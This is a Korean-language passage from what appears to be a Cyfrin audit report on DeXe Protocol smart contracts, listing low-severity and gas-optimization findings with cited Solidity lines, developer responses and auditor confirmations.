새 제안을 생성하려면 더 넓은 DAO 커뮤니티가 수용할 수 있는 제안을 설계하고, 제안 URL을 설정하고, 제안에 대한 찬성 및 반대 작업을 생성하는 등 많은 노력이 필요합니다. 제안 생성에 사용되는 가스 양은 성공적인 제안을 검증자에게 이동하는 것보다 높습니다.

**영향:** 위의 두 작업에 대해 동일한 보상을 제공하면 잘못된 인센티브가 생성됩니다.

**권장 완화 방법:** `GovPool::moveProposalToValidators`에 대한 보상을 `Rewards.Execute` 유형으로 변경하는 것을 고려하십시오. 사실상 제안을 검증자에게 이동하는 것에 대한 보상은 성공적인 제안을 실행하는 것에 대한 보상과 동일합니다.

**Dexe:**
[PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 주소 상태 변수에 값을 할당할 때 `address(0)` 확인 누락

**설명:** 주소 상태 변수에 값을 할당할 때 `address(0)` 확인이 누락되었습니다.

**영향:** 주소 상태 변수가 예기치 않게 `address(0)`으로 설정될 수 있습니다.

**개념 증명 (Proof of Concept):**
```solidity
File: gov/GovPool.sol

344:         _nftMultiplier = nftMultiplierAddress;

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

63:         govAddress = _govAddress;

```

Solarity 라이브러리에서:

```solidity
File: contracts-registry/pools/AbstractPoolContractsRegistry.sol

51:         _contractsRegistry = contractsRegistry_;

```

```solidity
File: contracts-registry/pools/pool-factory/AbstractPoolFactory.sol

31:         _contractsRegistry = contractsRegistry_;

```

```solidity
File: contracts-registry/pools/proxy/ProxyBeacon.sol

33:         _implementation = newImplementation_;

```

**권장 완화 방법:** 위에 `address(0)` 확인을 추가하는 것을 고려하십시오.

**Dexe:**
인지함; 제공된 예는 PoolFactory(여기서는 address(0)이 불가능함)와 관련이 있거나 일부 비즈니스 조건에서 0이 되도록 의도된 NFTMultiplier와 관련이 있습니다.


### 이벤트에 인덱스된 필드 누락

**설명:** 이벤트 필드를 인덱싱하면 이벤트를 파싱하는 오프체인 도구에서 필드에 더 빠르게 액세스할 수 있습니다. 그러나 각 인덱스 필드는 방출(emission) 시 추가 가스가 소요되므로 이벤트당 최대 허용치(3개 필드)를 모두 인덱싱하는 것이 반드시 최선은 아닙니다.

**영향:** 이벤트를 파싱하는 오프체인 도구의 액세스 속도가 느려집니다.

**개념 증명 (Proof of Concept):**
```solidity
File: factory/PoolFactory.sol

43:     event DaoPoolDeployed(

```

```solidity
File: gov/ERC721/multipliers/AbstractERC721Multiplier.sol

25:     event Minted(uint256 tokenId, address to, uint256 multiplier, uint256 duration);

26:     event Locked(uint256 tokenId, address sender, bool isLocked);

27:     event Changed(uint256 tokenId, uint256 multiplier, uint256 duration);

```

```solidity
File: gov/ERC721/multipliers/DexeERC721Multiplier.sol

21:     event AverageBalanceChanged(address user, uint256 averageBalance);

```

```solidity
File: gov/GovPool.sol

87:     event Delegated(address from, address to, uint256 amount, uint256[] nfts, bool isDelegate);

88:     event DelegatedTreasury(address to, uint256 amount, uint256[] nfts, bool isDelegate);

89:     event Deposited(uint256 amount, uint256[] nfts, address sender);

90:     event Withdrawn(uint256 amount, uint256[] nfts, address sender);

```

```solidity
File: gov/proposals/DistributionProposal.sol

31:     event DistributionProposalClaimed(

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

44:     event TierCreated(

49:     event Bought(uint256 tierId, address buyer);

50:     event Whitelisted(uint256 tierId, address user);

```

```solidity
File: gov/settings/GovSettings.sol

16:     event SettingsChanged(uint256 settingsId, string description);

17:     event ExecutorChanged(uint256 settingsId, address executor);

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

52:     event SetERC20(address token);

53:     event SetERC721(address token);

```

```solidity
File: gov/validators/GovValidators.sol

38:     event ExternalProposalCreated(uint256 proposalId, uint256 quorum);

39:     event InternalProposalCreated(

46:     event InternalProposalExecuted(uint256 proposalId, address executor);

48:     event Voted(uint256 proposalId, address sender, uint256 vote, bool isInternal, bool isVoteFor);

49:     event VoteCanceled(uint256 proposalId, address sender, bool isInternal);

```

```solidity
File: interfaces/gov/ERC721/IERC721Expert.sol

20:     event TagsAdded(uint256 indexed tokenId, string[] tags);

```

```solidity
File: libs/gov/gov-pool/GovPoolCreate.sol

24:     event ProposalCreated(

34:     event MovedToValidators(uint256 proposalId, address sender);

```

```solidity
File: libs/gov/gov-pool/GovPoolExecute.sol

24:     event ProposalExecuted(uint256 proposalId, bool isFor, address sender);

```

```solidity
File: libs/gov/gov-pool/GovPoolMicropool.sol

23:     event DelegatorRewardsClaimed(

```

```solidity
File: libs/gov/gov-pool/GovPoolOffchain.sol

16:     event OffchainResultsSaved(string resultsHash, address sender);

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

19:     event RewardClaimed(uint256 proposalId, address sender, address token, uint256 rewards);

20:     event VotingRewardClaimed(

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

19:     event VoteChanged(uint256 proposalId, address voter, bool isVoteFor, uint256 totalVoted);

20:     event QuorumReached(uint256 proposalId, uint256 timestamp);

21:     event QuorumUnreached(uint256 proposalId);

```

```solidity
File: libs/gov/gov-validators/GovValidatorsExecute.sol

16:     event ChangedValidatorsBalances(address[] validators, uint256[] newBalance);

```

```solidity
File: user/UserRegistry.sol

15:     event UpdatedProfile(address user, string url);

16:     event Agreed(address user, bytes32 documentHash);

17:     event SetDocumentHash(bytes32 hash);

```

Solarity 라이브러리에서:

```solidity
File: contracts-registry/AbstractContractsRegistry.sol

44:     event ContractAdded(string name, address contractAddress);

45:     event ProxyContractAdded(string name, address contractAddress, address implementation);

46:     event ProxyContractUpgraded(string name, address newImplementation);

47:     event ContractRemoved(string name);

```

```solidity
File: contracts-registry/pools/proxy/ProxyBeacon.sol

19:     event Upgraded(address implementation);

```

```solidity
File: diamond/Diamond.sol

39:     event DiamondCut(Facet[] facets, address initFacet, bytes initData);

```

```solidity
File: diamond/utils/InitializableStorage.sol

23:     event Initialized(bytes32 storageSlot);

```

```solidity
File: interfaces/access-control/IMultiOwnable.sol

8:     event OwnersAdded(address[] newOwners);

9:     event OwnersRemoved(address[] removedOwners);

```

```solidity
File: interfaces/access-control/IRBAC.sol

15:     event GrantedRoles(address to, string[] rolesToGrant);

16:     event RevokedRoles(address from, string[] rolesToRevoke);

18:     event AddedPermissions(string role, string resource, string[] permissionsToAdd, bool allowed);

19:     event RemovedPermissions(

```

```solidity
File: interfaces/access-control/extensions/IRBACGroupable.sol

8:     event AddedToGroups(address who, string[] groupsToAddTo);

9:     event RemovedFromGroups(address who, string[] groupsToRemoveFrom);

11:     event GrantedGroupRoles(string groupTo, string[] rolesToGrant);

12:     event RevokedGroupRoles(string groupFrom, string[] rolesToRevoke);

14:     event ToggledDefaultGroup(bool defaultGroupEnabled);

```

```solidity
File: interfaces/compound-rate-keeper/ICompoundRateKeeper.sol

8:     event CapitalizationPeriodChanged(uint256 newCapitalizationPeriod);

9:     event CapitalizationRateChanged(uint256 newCapitalizationRate);

```

**권장 완화 방법:** 나열된 이벤트의 필드를 인덱싱하는 것을 고려하십시오.

**Dexe:**
인지함; 우리는 이벤트의 정확한 시그니처에 의존하는 많은 서비스를 사용합니다. 이벤트를 변경하려면 해당 서비스를 변경해야 하며 나중에 변경할 수도 있습니다.


### `abi.encodePacked()`는 `keccak256()`과 같은 해시 함수에 결과를 전달할 때 동적 유형과 함께 사용해서는 안 됨

**설명:** `abi.encodePacked()`는 `keccak256()`과 같은 해시 함수에 결과를 전달할 때 동적 유형과 함께 사용해서는 안 됩니다.

대신 `abi.encode()`를 사용하면 항목을 32바이트로 채워 [해시 충돌을 방지](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode)할 수 있습니다(예: `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, 하지만 `abi.encode(0x123,0x456)` => `0x0...1230...456`).

강력한 이유가 없는 한 `abi.encode`를 선호해야 합니다. `abi.encodePacked()`에 대한 인수가 하나만 있는 경우 종종 `bytes()` 또는 `bytes32()`로 대신 [캐스트](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739) 할 수 있습니다. 모든 인수가 문자열 또는 바이트인 경우 `bytes.concat()`을 대신 사용해야 합니다.

**개념 증명 (Proof of Concept):**
```solidity
File: factory/PoolFactory.sol

263:         return keccak256(abi.encodePacked(deployer, poolName));

```

```solidity
File: libs/gov/gov-pool/GovPoolOffchain.sol

41:         return keccak256(abi.encodePacked(resultsHash, block.chainid, address(this)));

```

```solidity
File: user/UserRegistry.sol

44:         _signatureHashes[_documentHash][msg.sender] = keccak256(abi.encodePacked(signature));

```

**권장 완화 방법:** 설명을 참조하십시오.

**Dexe:**
인지함; 인코딩에 동적 유형 "string"이 하나만 있으므로 모든 것이 안전합니다. 또한 packed 인코딩은 백엔드에서 처리하기가 훨씬 간단합니다.


### 더 이상 사용되지 않는 라이브러리 함수 `safeApprove()` 사용

**설명:** `safeApprove()`는 더 이상 사용되지 않으며 공식 OpenZeppelin 문서는 `safeIncreaseAllowance()` 및 `safeDecreaseAllowance()` 사용을 [권장](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-)합니다.

**영향:** INFO

**개념 증명 (Proof of Concept):**
```solidity
File: core/PriceFeed.sol

385:             IERC20(token).safeApprove(address(uniswapV2Router), MAX_UINT);

```

**권장 완화 방법:** OpenZeppelin 계약의 더 이상 사용되지 않는 함수를 교체하는 것을 고려하십시오.

**Dexe:**
계약이 코드베이스에서 제거되어 수정되었습니다.

**Cyfrin:** 확인됨.


### ERC20에 대해 `transfer()` 대신 `safeTransfer()` 사용

**설명:** ERC20에 대해 `transfer` 대신 `safeTransfer`를 사용하십시오.

**영향:** INFO

**개념 증명 (Proof of Concept):**
```solidity
File: gov/GovPool.sol

248:             IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals()));

```

**권장 완화 방법:** ERC20에 대해 `transfer` 대신 `safeTransfer`를 사용하십시오.

**Dexe:**
커밋 [9078949](https://github.com/dexe-network/DeXe-Protocol/commit/9078949d6c968a914d2c5c1977b7331a6cbea7f6#diff-1112b85df220ebfd2bce44ff6c1e827cacbee838afaf25f75dd7e7e0d8017dbc)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 가스 최적화 (Gas Optimization)


### `CoreProperties` 계약의 불필요한 라이브러리 제거 가능

**설명:** `CoreProperties`에는 계약 로직에서 호출되지 않는 불필요한 라이브러리가 포함되어 있습니다:

 - `Math`
 - `AddressSetHelper`
 - `EnumerableSet`
 - `Paginator`


**영향:** 라이브러리는 계약 바이트코드를 불필요하게 증가시키고 배포 중 더 많은 가스를 소비합니다.

**권장 완화 방법:** 코드를 리팩토링하고 사용하지 않는 라이브러리를 제거하는 것을 고려하십시오.

**Dexe:**
커밋 [b417eaf](https://github.com/dexe-network/DeXe-Protocol/commit/b417eafe501100b8c36ec92494798bbd73add796)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `TokenSaleProposalCreate::_setParticipationInfo`에서 `participationDetails`의 불필요한 인코딩

**설명:** `TokenSaleProposalCreate::_setParticipationInfo` 구현에서 참여 유형이 `TokenLock`인 경우, 현재 로직은 `data`를 디코딩하여 금액을 추출하고 이 금액을 18 소수점으로 변환한 다음 새 금액으로 다시 인코딩합니다.


```solidity
    function _setParticipationInfo(
        ITokenSaleProposal.Tier storage tier,
        ITokenSaleProposal.TierInitParams memory tierInitParams
    ) private {
    ITokenSaleProposal.ParticipationInfo storage participationInfo = tier.participationInfo;

        for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {
            ITokenSaleProposal.ParticipationDetails memory participationDetails = tierInitParams
                .participationDetails[i];

               if(){
                  ....
               }
               else if (
                participationDetails.participationType ==
                ITokenSaleProposal.ParticipationType.TokenLock
            ) {
                require(participationDetails.data.length == 64, "TSP: invalid token lock data");

                (address token, uint256 amount) = abi.decode(
                    participationDetails.data,
                    (address, uint256)
                );

                uint256 to18Amount = token == ETHEREUM_ADDRESS
                    ? amount
                    : amount.to18(token.decimals());

     >>           participationDetails.data = abi.encode(token, to18Amount); // @audit encoding not needed

                require(to18Amount > 0, "TSP: zero token lock amount");
                require(
                    participationInfo.requiredTokenLock.set(token, to18Amount),
                    "TSP: multiple token lock requirements"
                );
            }
      }
   }
```

`participationDetails`는 메모리에 저장되고 `_setParticipationInfo`가 실행되면 더 이상 존재하지 않으므로 인코딩이 필요하지 않습니다.

**영향:** 가스 소비

**권장 완화 방법:** 금액이 18 소수점으로 정규화된 후 데이터 인코딩을 제거하는 것을 고려하십시오.

**Dexe:**
[PR155](https://github.com/dexe-network/DeXe-Protocol/commit/aa20564e99d6b7a54f8abaf2d538e3c2c7908718#diff-385858f2f510060a9e5f709e05eb51be54a74332460ee4e9b28c7602638a6521)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 루프 외부에서 배열 길이 캐시

**설명:** 배열 길이가 캐시되지 않으면 솔리디티 컴파일러는 각 반복마다 항상 배열 길이를 읽습니다. 즉, 스토리지 배열인 경우 이는 추가 sload 연산(첫 번째 반복을 제외한 각 반복마다 100 추가 가스)이고 메모리 배열인 경우 추가 mload 연산(첫 번째 반복을 제외하고 각 반복마다 3 추가 가스)입니다.

**영향:** 가스 최적화

**개념 증명 (Proof of Concept):**
```solidity
File: core/PriceFeed.sol

95:         require(foundPath.path.length > 0, "PriceFeed: unreachable asset");

141:         require(foundPath.path.length > 0, "PriceFeed: unreachable asset");

227:             foundPath.amounts.length > 0

228:                 ? (foundPath.amounts[foundPath.amounts.length - 1], foundPath.path)

258:             foundPath.amounts.length > 0 // @audit why is this different than getExtendedPriceOut()

```

```solidity
File: gov/ERC20/ERC20Gov.sol

55:         for (uint256 i = 0; i < params.users.length; i++) {

```

```solidity
File: gov/GovPool.sol

256:             for (uint256 i; i < nftIds.length; i++) {

305:         for (uint256 i; i < proposalIds.length; i++) {

318:         for (uint256 i; i < proposalIds.length; i++) {

415:         return _userInfos[user].votedInProposals.length();

```

```solidity
File: gov/proposals/DistributionProposal.sol

79:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

```

```solidity
File: gov/settings/GovSettings.sol

36:         for (; settingsId < proposalSettings.length; settingsId++) {

63:         for (uint256 i; i < _settings.length; i++) {

75:         for (uint256 i; i < _settings.length; i++) {

87:         for (uint256 i; i < executors.length; i++) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

210:         for (uint256 i; i < nftIds.length; i++) {

229:         for (uint256 i; i < nftIds.length; i++) {

259:         for (uint256 i; i < nftIds.length; i++) {

291:         for (uint256 i; i < nftIds.length; i++) {

316:         for (uint256 i; i < nftIds.length; i++) {

346:         for (uint256 i; i < nftIds.length; i++) {

389:         for (uint256 i; i < lockedProposals.length; i++) {

429:         for (uint256 i; i < nftIds.length; i++) {

445:         for (uint256 i; i < nftIds.length; i++) {

461:         for (uint256 i = 0; i < nftIds.length; i++) {

519:         totalBalance = _getBalanceInfoStorage(voter, voteType).nftBalance.length();

529:             totalBalance += _usersInfo[voter].allDelegatedNfts.length();

594:             for (uint256 i; i < nftIds.length; i++) {

708:             delegatorInfo.delegatedNfts[delegatee].length() == 0

```

```solidity
File: libs/gov/gov-pool/GovPoolCreate.sol

69:         for (uint256 i; i < actionsOnFor.length; i++) {

73:         for (uint256 i; i < actionsOnAgainst.length; i++) {

161:         for (uint256 i; i < actions.length; i++) {

218:         for (uint256 i; i < actions.length; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

298:         for (uint256 i; i < actionsFor.length; i++) {

325:         for (uint256 i; i < actions.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCredit.sol

25:         uint256 length = creditInfo.tokenList.length;

33:         for (uint256 i = 0; i < tokens.length; i++) {

44:         uint256 infoLength = creditInfo.tokenList.length;

```

```solidity
File: libs/gov/gov-pool/GovPoolMicropool.sol

100:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolUnlock.sol

27:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolView.sol

147:         for (uint256 i; i < unlockedIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

174:         for (uint256 i; i < nftIds.length; i++) {

```

```solidity
File: libs/gov/gov-user-keeper/GovUserKeeperView.sol

35:         for (uint256 i = 0; i < users.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

126:                     for (uint256 i; i < nftIds.length; i++) {

139:                 for (uint256 i; i < nftIds.length; i++) {

163:         delegationsInfo = new IGovUserKeeper.DelegationInfoView[](userInfo.delegatees.length());

165:         for (uint256 i; i < delegationsInfo.length; i++) {

192:         for (uint256 i; i < lockedProposals.length; i++) {

199:         uint256 nftsLength = balanceInfo.nftBalance.length();

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsUtils.sol

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol

171:         if (participationInfo.requiredTokenLock.length() > 0) {

175:         if (participationInfo.requiredNftLock.length() > 0) {

200:         uint256 lockedTokenLength = purchaseInfo.lockedTokens.length();

212:         uint256 lockedNftLength = purchaseInfo.lockedNftAddresses.length();

224:         uint256 purchaseTokenLength = purchaseInfo.spentAmounts.length();

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalCreate.sol

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

```

```solidity
File: libs/price-feed/UniswapV2PathFinder.sol

86:                 if (foundPath.path.length == 0 || compare(amounts, foundPath.amounts)) {

99:                 if (foundPath.path.length == 0 || compare(amounts, foundPath.amounts)) {

```

```solidity
File: libs/utils/AddressSetHelper.sol

10:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

```

Solarity 라이브러리에서:

```solidity
File: access-control/RBAC.sol

103:         for (uint256 i = 0; i < permissionsToAdd_.length; i++) {

124:         for (uint256 i = 0; i < permissionsToRemove_.length; i++) {

173:         for (uint256 i = 0; i < allowed_.length; i++) {

178:         for (uint256 i = 0; i < disallowed_.length; i++) {

200:         for (uint256 i = 0; i < roles_.length; i++) {

```

```solidity
File: access-control/extensions/RBACGroupable.sol

157:         for (uint256 i = 0; i < roles_.length; i++) {

169:         for (uint256 i = 0; i < groups_.length; i++) {

172:             for (uint256 j = 0; j < roles_.length; j++) {

```

```solidity
File: contracts-registry/pools/AbstractPoolContractsRegistry.sol

125:         for (uint256 i = 0; i < names_.length; i++) {

```

```solidity
File: diamond/Diamond.sol

78:         for (uint256 i; i < facets_.length; i++) {

110:         for (uint256 i = 0; i < selectors_.length; i++) {

134:         for (uint256 i = 0; i < selectors_.length; i++) {

161:         for (uint256 i; i < selectors_.length; i++) {

```

```solidity
File: diamond/DiamondStorage.sol

53:         facets_ = new FacetInfo[](_facets.length());

55:         for (uint256 i = 0; i < facets_.length; i++) {

75:         for (uint256 i = 0; i < selectors_.length; i++) {

```

```solidity
File: libs/arrays/ArrayHelper.sol

98:         for (uint256 i = 1; i < prefixes_.length; i++) {

160:         for (uint256 i = 0; i < what_.length; i++) {

172:         for (uint256 i = 0; i < what_.length; i++) {

184:         for (uint256 i = 0; i < what_.length; i++) {

196:         for (uint256 i = 0; i < what_.length; i++) {

```

```solidity
File: libs/arrays/SetHelper.sol

22:         for (uint256 i = 0; i < array_.length; i++) {

28:         for (uint256 i = 0; i < array_.length; i++) {

34:         for (uint256 i = 0; i < array_.length; i++) {

45:         for (uint256 i = 0; i < array_.length; i++) {

51:         for (uint256 i = 0; i < array_.length; i++) {

57:         for (uint256 i = 0; i < array_.length; i++) {

```

```solidity
File: mock/libs/data-structures/StringSetMock.sol

38:         for (uint256 i = 0; i < set_.length; i++) {

```

```solidity
File: mock/libs/data-structures/memory/VectorMock.sol

42:         for (uint256 i = 0; i < vector2_.length(); i++) {

70:         for (uint256 i = 0; i < vector_.length(); i++) {

100:         for (uint256 i = 0; i < array_.length; i++) {

```

```solidity
File: mock/libs/zkp/snarkjs/VerifierMock.sol

34:         for (uint256 i = 0; i < inputs_.length; i++) {

54:         for (uint256 i = 0; i < inputs_.length; i++) {

```

```solidity
File: oracles/UniswapV2Oracle.sol

137:         return _pairInfos[pair_].blockTimestamps.length;

```

**권장 완화 방법:** 루프 외부에서 또는 배열 길이가 여러 번 액세스될 때 배열 길이를 캐시하십시오.

**Dexe:**
인지함; 우리는 2-3 wei의 최적화를 큰 이점으로 간주하지 않습니다. 이 경우 코드 가독성이 우선입니다.


### 상태 변수는 스토리지에서 다시 읽는 대신 스택 변수에 캐시해야 함

**설명:** 아래 인스턴스는 함수 내에서 상태 변수에 두 번째 이상 액세스하는 것을 나타냅니다. 상태 변수를 캐싱하면 각 Gwarmaccess(100 가스)가 훨씬 저렴한 스택 읽기로 대체됩니다. 덜 분명한 다른 수정/최적화에는 상태 변수 구조체의 로컬 메모리 캐시를 갖거나 상태 변수 계약/주소의 로컬 캐시를 갖는 것이 포함됩니다.

**영향:** 가스 최적화

**개념 증명 (Proof of Concept):**
```solidity
File: core/PriceFeed.sol

385:             IERC20(token).safeApprove(address(uniswapV2Router), MAX_UINT);

```

```solidity
File: gov/GovPool.sol

257:                 nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]);

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

567:         ERC721Power nftContract = ERC721Power(nftAddress);

```

**권장 완화 방법:** 상태 변수는 스토리지에서 다시 읽는 대신 스택 변수에 캐시해야 합니다.

**Dexe:**
인지함; 우리는 2-3 wei의 최적화를 큰 이점으로 간주하지 않습니다. 이 경우 코드 가독성이 우선입니다. 최적화가 합리적인 곳이면 어디든지 코드를 최적화했습니다.


### 오버플로가 불가능할 때 루프 카운터를 증가시키기 위해 unchecked 블록 사용

**설명:** 오버플로가 불가능할 때 루프 카운터를 증가시키기 위해 unchecked 블록을 사용하십시오. 루프 카운터 증가에 `i++`보다 `++i`를 선호하십시오. 특정 조건 하에서 Solidity 0.8.22의 [표준 최적화](https://soliditylang.org/blog/2023/10/25/solidity-0.8.22-release-announcement/)로 포함되었습니다.

**영향:** 가스 최적화

**개념 증명 (Proof of Concept):**
```solidity
File: gov/ERC20/ERC20Gov.sol

55:         for (uint256 i = 0; i < params.users.length; i++) {

55:         for (uint256 i = 0; i < params.users.length; i++) {

```

```solidity
File: gov/GovPool.sol

256:             for (uint256 i; i < nftIds.length; i++) {

256:             for (uint256 i; i < nftIds.length; i++) {

305:         for (uint256 i; i < proposalIds.length; i++) {

305:         for (uint256 i; i < proposalIds.length; i++) {

318:         for (uint256 i; i < proposalIds.length; i++) {

318:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: gov/proposals/DistributionProposal.sol

79:         for (uint256 i; i < proposalIds.length; i++) {

79:         for (uint256 i; i < proposalIds.length; i++) {

```


```solidity
File: gov/proposals/TokenSaleProposal.sol

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

```

```solidity
File: gov/settings/GovSettings.sol

36:         for (; settingsId < proposalSettings.length; settingsId++) {

36:         for (; settingsId < proposalSettings.length; settingsId++) {

63:         for (uint256 i; i < _settings.length; i++) {

63:         for (uint256 i; i < _settings.length; i++) {

65:             _setSettings(_settings[i], settingsId++);

65:             _setSettings(_settings[i], settingsId++);

75:         for (uint256 i; i < _settings.length; i++) {

75:         for (uint256 i; i < _settings.length; i++) {

87:         for (uint256 i; i < executors.length; i++) {

87:         for (uint256 i; i < executors.length; i++) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

210:         for (uint256 i; i < nftIds.length; i++) {

210:         for (uint256 i; i < nftIds.length; i++) {

229:         for (uint256 i; i < nftIds.length; i++) {

229:         for (uint256 i; i < nftIds.length; i++) {

259:         for (uint256 i; i < nftIds.length; i++) {

259:         for (uint256 i; i < nftIds.length; i++) {

291:         for (uint256 i; i < nftIds.length; i++) {

291:         for (uint256 i; i < nftIds.length; i++) {

316:         for (uint256 i; i < nftIds.length; i++) {

316:         for (uint256 i; i < nftIds.length; i++) {

346:         for (uint256 i; i < nftIds.length; i++) {

346:         for (uint256 i; i < nftIds.length; i++) {

389:         for (uint256 i; i < lockedProposals.length; i++) {

389:         for (uint256 i; i < lockedProposals.length; i++) {

429:         for (uint256 i; i < nftIds.length; i++) {

429:         for (uint256 i; i < nftIds.length; i++) {

445:         for (uint256 i; i < nftIds.length; i++) {

445:         for (uint256 i; i < nftIds.length; i++) {

461:         for (uint256 i = 0; i < nftIds.length; i++) {

461:         for (uint256 i = 0; i < nftIds.length; i++) {

569:         for (uint256 i; i < ownedLength; i++) {

569:         for (uint256 i; i < ownedLength; i++) {

594:             for (uint256 i; i < nftIds.length; i++) {

594:             for (uint256 i; i < nftIds.length; i++) {

```

```solidity
File: gov/validators/GovValidators.sol

215:         for (uint256 i = offset; i < to; i++) {

215:         for (uint256 i = offset; i < to; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCreate.sol

69:         for (uint256 i; i < actionsOnFor.length; i++) {
```solidity
69:         for (uint256 i; i < actionsOnFor.length; i++) {

73:         for (uint256 i; i < actionsOnAgainst.length; i++) {

73:         for (uint256 i; i < actionsOnAgainst.length; i++) {

161:         for (uint256 i; i < actions.length; i++) {

161:         for (uint256 i; i < actions.length; i++) {

218:         for (uint256 i; i < actions.length; i++) {

218:         for (uint256 i; i < actions.length; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

298:         for (uint256 i; i < actionsFor.length; i++) {

298:         for (uint256 i; i < actionsFor.length; i++) {

325:         for (uint256 i; i < actions.length; i++) {

325:         for (uint256 i; i < actions.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCredit.sol

27:         for (uint256 i = 0; i < length; i++) {

27:         for (uint256 i = 0; i < length; i++) {

33:         for (uint256 i = 0; i < tokens.length; i++) {

33:         for (uint256 i = 0; i < tokens.length; i++) {

49:         for (uint256 i = 0; i < infoLength; i++) {

49:         for (uint256 i = 0; i < infoLength; i++) {

70:         for (uint256 i = 0; i < tokensLength; i++) {

70:         for (uint256 i = 0; i < tokensLength; i++) {

```


```solidity
File: libs/gov/gov-pool/GovPoolExecute.sol

60:         for (uint256 i; i < actionsLength; i++) {

60:         for (uint256 i; i < actionsLength; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolMicropool.sol

100:         for (uint256 i; i < proposalIds.length; i++) {

100:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

135:             for (uint256 i = length; i > 0; i--) {

135:             for (uint256 i = length; i > 0; i--) {

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

